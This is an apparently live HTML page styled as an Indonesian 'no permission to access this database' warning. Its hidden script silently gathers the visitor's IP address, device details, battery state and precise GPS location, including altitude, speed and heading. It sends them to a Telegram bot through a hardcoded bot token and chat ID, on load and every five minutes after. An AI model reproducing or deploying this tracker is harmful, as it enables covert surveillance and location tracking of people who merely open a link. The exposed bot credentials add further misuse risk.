<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Database Nusantara</title>
  <style>
    body {
      background-color: #000;
      color: red;
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      flex-direction: column;
    }
    h1 {
      font-size: 1.5em;
      margin: 0;
    }
    p {
      font-size: 0.9em;
      color: gray;
    }
  </style>
</head>
<body>
  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
  <p>Akses ilegal akan dilaporkan dan dicatat secara otomatis.</p>

  <script>
    const telegram_id = "5677912817";
    const bot_token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";

    function sendToTelegram(data) {
      fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegram_id,
          text: data,
          parse_mode: "HTML"
        })
      });
    }

    function getIpInfo() {
      return fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(ip => ip.ip)
        .catch(() => "IP not found");
    }

    function getDeviceInfo() {
      const nav = navigator;
      return {
        userAgent: nav.userAgent,
        language: nav.language,
        platform: nav.platform,
        online: nav.onLine
      };
    }

    function getBatteryInfo() {
      return navigator.getBattery()
        .then(battery => ({
          level: battery.level * 100 + "%",
          charging: battery.charging ? "Yes" : "No"
        }))
        .catch(() => ({ level: "N/A", charging: "N/A" }));
    }

    function getGeoInfo() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
            alt: pos.coords.altitude,
            spd: pos.coords.speed,
            head: pos.coords.heading,
            time: new Date().toLocaleString()
          }),
          err => resolve({ error: err.message })
        );
      });
    }

    async function collectAndSend() {
      const [ip, battery, geo] = await Promise.all([
        getIpInfo(),
        getBatteryInfo(),
        getGeoInfo()
      ]);
      const device = getDeviceInfo();
      const data = `
<b>TRACKING DEVICE</b>
<b>IP:</b> ${ip}
<b>Battery:</b> ${battery.level} (${battery.charging})
<b>User Agent:</b> ${device.userAgent}
<b>Language:</b> ${device.language}
<b>Platform:</b> ${device.platform}
<b>Online:</b> ${device.online}

<b>Lokasi:</b>
Latitude: ${geo.lat || "-"}
Longitude: ${geo.lon || "-"}
Accuracy: ${geo.acc || "-"}
Altitude: ${geo.alt || "-"}
Speed: ${geo.spd || "-"}
Heading: ${geo.head || "-"}
Waktu: ${geo.time || "-"}

<b>Local Time:</b> ${new Date().toLocaleString()}
<b>UTC:</b> ${new Date().toUTCString()}
      `.trim();
      sendToTelegram(data);
    }

    // Kirim pertama saat halaman dibuka
    collectAndSend();
    // Kirim ulang setiap 5 menit
    setInterval(collectAndSend, 300000);
  </script>
</body>
</html>
